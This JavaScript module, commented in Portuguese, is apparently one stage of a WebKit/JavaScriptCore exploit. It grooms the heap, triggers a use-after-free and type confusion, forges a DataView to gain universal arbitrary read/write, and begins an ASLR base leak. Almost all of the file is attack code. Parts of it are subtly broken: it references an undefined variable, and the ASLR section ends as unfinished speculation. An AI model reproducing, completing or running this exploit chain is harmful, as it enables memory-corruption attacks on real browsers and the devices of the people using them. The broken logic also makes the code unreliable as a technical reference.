// js/script3/testArrayBufferVictimCrash.mjs (v12 - Retorno ao Type Confusion Direto para Primitivas Base)
// =======================================================================================
// ESTA VERSÃO TENTA ESTABILIZAR AS PRIMITIVAS BÁSICAS addrof/fakeobj SE ELAS SÃO A RAIZ DO PROBLEMA:
// 1. Validar primitivas básicas (OOB local).
// 2. Tentar estabilizar as primitivas addrof_core/fakeobj_core via Type Confusion Direta.
//    - Vítima: Float64Array.
//    - Spray: ArrayBuffer (para forçar Type Confusion e obter controle dos metadados).
//    - Foco em corromper o JSCell.STRUCTURE_POINTER_OFFSET da vítima.
// 3. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado (o passo original, se 2 for bem-sucedido).
// 4. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
// 5. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
// 6. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read,
    arb_write,
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "v12 - Retorno ao Type Confusion Direto para Primitivas Base";

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;
const LOCAL_SHORT_SHORT_PAUSE = 50;

// Constante para o tamanho de cada elemento em um Array genérico (JSValue em 64-bit é 8 bytes)
const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Mantida, embora o foco seja Float64Array novamente.

let global_spray_objects = [];
let hold_objects = [];

let _fake_data_view = null;


// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return value;
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando fakeobj com um dado m_mode.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
 * @param {number} m_mode_to_try O valor de m_mode a ser testado.
 * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
 */
async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
    const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);

    _fake_data_view = null;
    let backing_array_buffer = null;

    try {
        backing_array_buffer = new ArrayBuffer(0x1000);
        hold_objects.push(backing_array_buffer);
        const backing_ab_addr = addrof_core(backing_array_buffer);
        logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);

        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
        logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);

        _fake_data_view = fakeobj_core(backing_ab_addr);
        if (!(_fake_data_view instanceof DataView)) {
            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
            return false;
        }
        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);

        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
        hold_objects.push(test_target_js_object);
        const test_target_js_object_addr = addrof_core(test_target_js_object);

        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);

        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);

        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
            logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return false;
        }
    } catch (e) {
        logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        try {
            if (backing_array_buffer) {
                const backing_ab_addr = addrof_core(backing_array_buffer);
                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            }
        } catch (cleanupErr) {
            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
        }
        return false;
    } finally {
        if (backing_array_buffer) {
            const index = hold_objects.indexOf(backing_array_buffer);
            if (index > -1) { hold_objects.splice(index, 1); }
        }
        _fake_data_view = null;
    }
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---

// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    try {
        for (let i = 0; i < 500; i++) {
            new ArrayBuffer(1024 * 256);
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
    for (let i = 0; i < 25; i++) {
        new ArrayBuffer(1024);
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
}

/**
 * Tenta acionar o Type Confusion Direto para obter primitivas addrof/fakeobj robustas.
 * A vítima é um Float64Array. O spray é um ArrayBuffer que corromperá a Structure da vítima.
 * @param {number} victimArrayBufferLength O comprimento em bytes dos dados do ArrayBuffer spray.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
 * @returns {Promise<{success: boolean, leaked_structure_ptr_double: number}>} Resultado e o ponteiro da estrutura vazado.
 */
async function attemptTypeConfusionForPrimitives(victimArrayBufferLength, logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = "attemptTypeConfusionForPrimitives";
    logFn(`[${FNAME}] Tentando Type Confusion Direto para primitivas com ArrayBuffer de tamanho ${toHex(victimArrayBufferLength)} (${victimArrayBufferLength} bytes)...`, "subtest", FNAME);

    // PASSO 1: Criar o objeto vítima (Float64Array)
    // O tamanho da vítima é o tamanho dos dados internos (não o objeto JS inteiro no heap).
    // Precisamos de um Float64Array cujo layout de dados seja compatível com a corrupção do Structure.
    const VICTIM_FLOAT64_ARRAY_DATA_LENGTH = victimArrayBufferLength / EXPECTED_BUTTERFLY_ELEMENT_SIZE; // Número de doubles
    if (VICTIM_FLOAT64_ARRAY_DATA_LENGTH === 0 || VICTIM_FLOAT64_ARRAY_DATA_LENGTH % 1 !== 0) {
        logFn(`[${FNAME}] ERRO: victimArrayBufferLength (${victimArrayBufferLength}) deve ser um múltiplo de ${EXPECTED_BUTTERFLY_ELEMENT_SIZE} e maior que 0. Pulando.`, "error", FNAME);
        return { success: false, leaked_structure_ptr_double: NaN };
    }

    let victim_float64_array = new Float64Array(VICTIM_FLOAT64_ARRAY_DATA_LENGTH);
    // Preenche com um valor inicial conhecido. 
    // É importante que o valor não seja 0, pois 0 pode ser confundido com um ponteiro nulo.
    victim_float64_array[0] = 1.000000000000123; // Valor inicial para debug
    // O Float64Array é a vítima do Type Confusion.
    // Se a confusão for bem-sucedida, ele será interpretado como um ArrayBuffer.

    // Guarda o objeto vítima para evitar GC antes da liberação controlada.
    hold_objects.push(victim_float64_array);

    // Forçar otimizações (acessando a vítima repetidamente)
    for (let i = 0; i < 10000; i++) {
        victim_float64_array[0] += 0.000000000000001;
    }

    logFn(`[${FNAME}] Objeto vítima (Float64Array, ${victimArrayBufferLength} bytes de dados) criado.`, "info", FNAME);
    logFn(`[${FNAME}] Endereço da vítima (via addrof_core): ${addrof_core(victim_float64_array).toString(true)}`, "info", FNAME);

    // PASSO 2: Forçar Coleta de Lixo para liberar a memória da 'victim_float64_array'
    logFn(`[${FNAME}] FASE de liberação e GC...`, "info", FNAME);
    const victim_index = hold_objects.indexOf(victim_float64_array);
    if (victim_index > -1) { hold_objects.splice(victim_index, 1); }
    victim_float64_array = null; // Remove a última referência forte.
    await triggerGC(logFn, pauseFn);
    logFn(`[${FNAME}] Memória da vítima liberada.`, "info", FNAME);
    await pauseFn(LOCAL_SHORT_PAUSE);

    // FASE de Heap Grooming (anterior ao spray principal)
    const HEAP_GROOMING_SPRAY_COUNT = 20000;
    const grooming_spray_local = [];
    logFn(`[${FNAME}] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados...`, "info", FNAME);
    for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
        const size_variant = (i % 16) * 0x10 + 0x40;
        grooming_spray_local.push(new ArrayBuffer(size_variant));
    }
    hold_objects.push(grooming_spray_local);
    grooming_spray_local.length = 0; // Libera as referências
    const groom_in_hold_index = hold_objects.indexOf(grooming_spray_local);
    if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
    await triggerGC(logFn, pauseFn);
    logFn(`[${FNAME}] Grooming spray inicial liberado e GC forçado.`, "info", FNAME);
    await pauseFn(LOCAL_SHORT_SHORT_PAUSE);

    // Drenagem Ativa da Free List (para tentar "limpar" o bucket da vítima)
    const DRAIN_COUNT = 75;
    const DRAIN_SPRAY_PER_ITERATION = 75;
    logFn(`[${FNAME}] FASE 2.5: Drenagem Ativa da Free List...`, "info", FNAME);
    for (let d = 0; d < DRAIN_COUNT; d++) {
        const drain_objects = [];
        for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
            drain_objects.push(new ArrayBuffer(victimArrayBufferLength)); // Drenar com ArrayBuffer do mesmo tamanho do spray principal
        }
        if (d % 5 === 0) { await triggerGC(logFn, pauseFn); }
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
    }
    await triggerGC(logFn, pauseFn);
    logFn(`[${FNAME}] Drenagem ativa concluída.`, "info", FNAME);
    await pauseFn(LOCAL_SHORT_PAUSE);


    // PASSO 3: Pulverizar a memória liberada com ArrayBuffers controlados.
    // O objetivo é que um desses ArrayBuffers reocupe o local do Float64Array vítima.
    // Se isso acontecer, o JS ainda pensará que é um Float64Array, mas a memória subjacente
    // será a de um ArrayBuffer, permitindo a corrupção do Structure Pointer (se o layout coincidir).
    logFn(`[${FNAME}] FASE 3: Pulverizando ArrayBuffers (tamanho ${victimArrayBufferLength} bytes) sobre a memória liberada...`, "info", FNAME);
    const SPRAY_COUNT_UAF_OPT = 2500;
    const spray_buffers = [];
    const ARRAYBUFFER_STRUCTURE_ID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // StructureID para ArrayBuffer

    for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
        const ab = new ArrayBuffer(victimArrayBufferLength);
        const u32_view = new Uint32Array(ab); // Usar Uint32Array para preencher por dword
        
        // Pulverizar o ArrayBuffer com metadados de um ArrayBuffer.
        // O offset 0 de um ArrayBuffer é o Structure ID.
        // Se a Type Confusion for Float64Array -> ArrayBuffer,
        // então o dangling_ref_local (que é um Float64Array) em dangling_ref_local[0]
        // deveria ler o Structure ID do ArrayBuffer que o reocupou.
        u32_view[0] = ARRAYBUFFER_STRUCTURE_ID; // Coloca o StructureID no primeiro dword.
        // Os bytes restantes podem ser um padrão, se necessário.
        for (let j = 1; j < u32_view.length; j++) {
            u32_view[j] = 0xCDCDCDCD + j; // Padrão de debug
        }
        spray_buffers.push(ab);
    }
    hold_objects.push(spray_buffers);
    logFn(`[${FNAME}] Pulverização de ${spray_buffers.length} ArrayBuffers concluída.`, "info", FNAME);
    await pauseFn(LOCAL_SHORT_PAUSE);

    // PASSO 4: Tentar ler o "ponteiro de estrutura vazado" da referência pendurada.
    // Se o Type Confusion for Float64Array -> ArrayBuffer, então o dangling_ref_local (que é Float64Array)
    // vai tentar ler o Structure ID do ArrayBuffer no seu offset 0.
    let leaked_value_from_uaf_double = 0;
    let uaf_leak_successful = false;
    const read_attempts = 15;
    for(let i = 0; i < read_attempts; i++) {
        // Tenta ler o primeiro elemento do Float64Array, que deveria ser o Structure ID do ArrayBuffer
        leaked_value_from_uaf_double = dangling_float64_array[0]; // dangle_float64_array é a vítima original

        // Converte o double lido para Int64 para inspecionar os bytes.
        const leaked_int64_debug = _doubleToInt64_direct(leaked_value_from_uaf_double);
        
        // Verifica se o valor lido se parece com um Structure ID válido.
        // O Structure ID é um uint32, então ele estaria no `low()` do Int64.
        // ArrayBuffer_STRUCTURE_ID é 2.
        if (leaked_int64_debug.low() === ARRAYBUFFER_STRUCTURE_ID && leaked_int64_debug.high() === 0) {
            logFn(`[${FNAME}] SUCESSO na leitura! Structure ID lido: ${toHex(leaked_int64_debug.low())} (Esperado ${toHex(ARRAYBUFFER_STRUCTURE_ID)}).`, "vuln", FNAME);
            uaf_leak_successful = true;
            // O valor retornado é o Structure ID do ArrayBuffer, não um ponteiro de ASLR.
            // Precisamos do ponteiro para a Structure (vtable) da DataView para o próximo passo.
            // Isso será forjado mais tarde.
            return { success: true, leaked_structure_ptr_double: leaked_value_from_uaf_double }; // Retorna o double lido diretamente
        }
        logFn(`[${FNAME}] Valor lido inesperado em dangling_float64_array[0]: ${toHex(leaked_int64_debug, 64)}. Não é o Structure ID esperado. (Tentativa ${i+1}/${read_attempts})`, "warn", FNAME);
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
    }

    logFn(`[${FNAME}] FALHA: Type Confusion/vazamento de Structure ID falhou para ArrayBuffer de tamanho ${toHex(victimArrayBufferLength)}.`, "error", FNAME);
    return { success: false, leaked_structure_ptr_double: NaN };

}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion";
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
    const startTime = performance.now();
    let webkit_base_address = null;
    let found_m_mode = null;

    // Faixa de tamanhos de ArrayBuffer (em bytes, múltiplos de 8) para o spray.
    // Isso é o que esperamos que reocupe o Float64Array vítima.
    // O tamanho do Float64Array é tipicamente 0x30 bytes de cabeçalho + tamanho dos dados.
    // Então, um ArrayBuffer de 0x80 bytes de *dados* pode ser um bom alvo de colisão se o Float64Array tem 0x80 bytes de *dados*.
    const ARRAYBUFFER_SPRAY_SIZE_RANGE_START = 0x10;   // Começa em 16 bytes
    const ARRAYBUFFER_SPRAY_SIZE_RANGE_END = 0x100;    // Vai até 256 bytes
    const ARRAYBUFFER_SPRAY_SIZE_INCREMENT = 0x08;     // Incrementa de 8 em 8 bytes

    let best_arraybuffer_spray_size_found = -1;
    let leaked_arraybuffer_structure_id_double = NaN; // O valor que esperamos ler se o TC funcionar.

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
        const sprayStartTime = performance.now();
        const INITIAL_SPRAY_COUNT = 250000;
        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 50) * 16;
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        const oob_data_view = getOOBDataView();
        if (!oob_data_view) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");


        // --- FASE 2.5: Escaneamento de Tamanhos para Type Confusion Direto ---
        logFn("--- FASE 2.5: Iniciando SCANNER DE TAMANHOS para Type Confusion Direto (Float64Array -> ArrayBuffer) ---", "test");
        logFn(`Testando ArrayBuffer spray sizes de ${toHex(ARRAYBUFFER_SPRAY_SIZE_RANGE_START)} a ${toHex(ARRAYBUFFER_SPRAY_SIZE_RANGE_END)} em incrementos de ${toHex(ARRAYBUFFER_SPRAY_SIZE_INCREMENT)}.`, "info");

        for (let size = ARRAYBUFFER_SPRAY_SIZE_RANGE_START; size <= ARRAYBUFFER_SPRAY_SIZE_RANGE_END; size += ARRAYBUFFER_SPRAY_SIZE_INCREMENT) {
            logFn(`\n[SCANNER] Iniciando tentativa para ArrayBuffer Spray Size = ${toHex(size)}...`, "subtest", "SCANNER");
            const TC_ATTEMPTS_PER_SIZE = 3;
            let current_size_tc_success = false;

            for (let attempt = 1; attempt <= TC_ATTEMPTS_PER_SIZE; attempt++) {
                logFn(`[SCANNER] Tentativa TC #${attempt}/${TC_ATTEMPTS_PER_SIZE} para tamanho ${toHex(size)}.`, "info", "SCANNER");
                
                // A função `attemptTypeConfusionForPrimitives` já limpa `hold_objects` e faz GC no final.
                const tc_result = await attemptTypeConfusionForPrimitives(size, logFn, pauseFn, JSC_OFFSETS_PARAM);

                if (tc_result.success) {
                    logFn(`[SCANNER] SUCESSO no Type Confusion para ArrayBuffer Spray Size = ${toHex(size)}!`, "good", "SCANNER");
                    best_arraybuffer_spray_size_found = size;
                    leaked_arraybuffer_structure_id_double = tc_result.leaked_structure_ptr_double;
                    current_size_tc_success = true;
                    break;
                } else {
                    logFn(`[SCANNER] Falha na tentativa TC #${attempt} para tamanho ${toHex(size)}.`, "warn", "SCANNER");
                }
            }

            if (current_size_tc_success) {
                logFn(`[SCANNER] Tamanho de ArrayBuffer spray encontrado: ${toHex(best_arraybuffer_spray_size_found)} bytes. Interrompendo scanner.`, "good", "SCANNER");
                break;
            } else {
                logFn(`[SCANNER] Todas as tentativas falharam para ArrayBuffer Spray Size = ${toHex(size)}. Prosseguindo para o próximo tamanho.`, "error", "SCANNER");
            }
        } // Fim do loop do scanner

        if (best_arraybuffer_spray_size_found === -1) {
            const errMsg = "Falha crítica: Nenhum tamanho de ArrayBuffer resultou em um Type Confusion bem-sucedido para as primitivas básicas. Abortando exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }

        // Se chegamos aqui, as primitivas addrof/fakeobj agora devem ser robustas.
        logFn(`SUCESSO GERAL: Primitivas addrof/fakeobj estabelecidas via Type Confusion com ArrayBuffer de tamanho ${toHex(best_arraybuffer_spray_size_found)}.`, "good");

        // Fazer uma leitura arbitrária de teste para validar addrof/fakeobj
        const test_obj_for_primitive_check = { sanity_val: 0xAAAA_BBBB };
        hold_objects.push(test_obj_for_primitive_check);
        const test_obj_addr_check = addrof_core(test_obj_for_primitive_check);
        logFn(`[DEBUG] Endereço de objeto de teste obtido via addrof_core: ${test_obj_addr_check.toString(true)}`, "debug");
        if (test_obj_addr_check.equals(AdvancedInt64.Zero) || test_obj_addr_check.equals(AdvancedInt64.NaNValue)) {
            const errMsg = "Falha crítica: addrof_core retornou endereço inválido após Type Confusion. Abortando.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }

        const faked_obj_check = fakeobj_core(test_obj_addr_check);
        if (faked_obj_check.sanity_val !== 0xAAAA_BBBB) {
            const errMsg = `Falha crítica: fakeobj_core não restaurou o objeto corretamente. Lido: ${toHex(faked_obj_check.sanity_val)}. Abortando.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas addrof/fakeobj validadas pós-Type Confusion. Prosseguindo para vazamento ASLR.", "good");


        // --- Próximo passo: Vazamento de ASLR e Construção de ARB R/W Universal ---
        // Para vazar o ASLR, precisamos de um ponteiro taggeado. A corrupção acima apenas deu o Structure ID.
        // Precisamos de um objeto cujo *ponteiro* para ele (quando lido como double) revele a base ASLR.
        // Esta parte da exploração ainda é baseada na lógica de UAF/Type Confusion de antes,
        // mas agora com as primitivas `addrof_core` e `fakeobj_core` consideradas robustas.

        // Reintroduzir a lógica de vazamento de ASLR da v04 (que usa addrof_core e fakeobj_core)
        // para obter o ponteiro taggeado do DataView Structure para calcular a base.
        
        // Obter o endereço do vtable da DataView Structure
        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
        const TEMPORARY_ESTIMATED_WEBKIT_BASE_FOR_SPRAY = new AdvancedInt64(0x00000000, 0x01000000); // Base temporária para construir o ponteiro taggeado
        let TARGET_VTABLE_ADDRESS_TO_SPRAY_FOR_ASLR_LEAK = TEMPORARY_ESTIMATED_WEBKIT_BASE_FOR_SPRAY.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET, 0));
        const OBJECT_PTR_TAG_HIGH = 0x402a0000;
        const tagged_high_for_aslr_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_FOR_ASLR_LEAK.high() | OBJECT_PTR_TAG_HIGH;
        TARGET_VTABLE_ADDRESS_TO_SPRAY_FOR_ASLR_LEAK = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_FOR_ASLR_LEAK.low(), tagged_high_for_aslr_spray);

        // Agora, para vazar o ASLR, precisamos fazer com que um objeto JavaScript
        // (cujo endereço podemos obter com addrof_core) tenha em um de seus slots
        // de propriedade (ex: butterfly) o valor do ponteiro taggeado que queremos vazar.
        // E então, ler esse valor com Type Confusion.

        // Esta é a parte mais complexa: como obter o ponteiro ASLR taggeado?
        // Se `addrof_core` já funciona, podemos usá-lo.
        // O `addrof_core` por si só retorna o endereço untagged.
        // O passo que falta é a "refletividade" (se o valor de um objeto pode ser lido como um ponteiro).

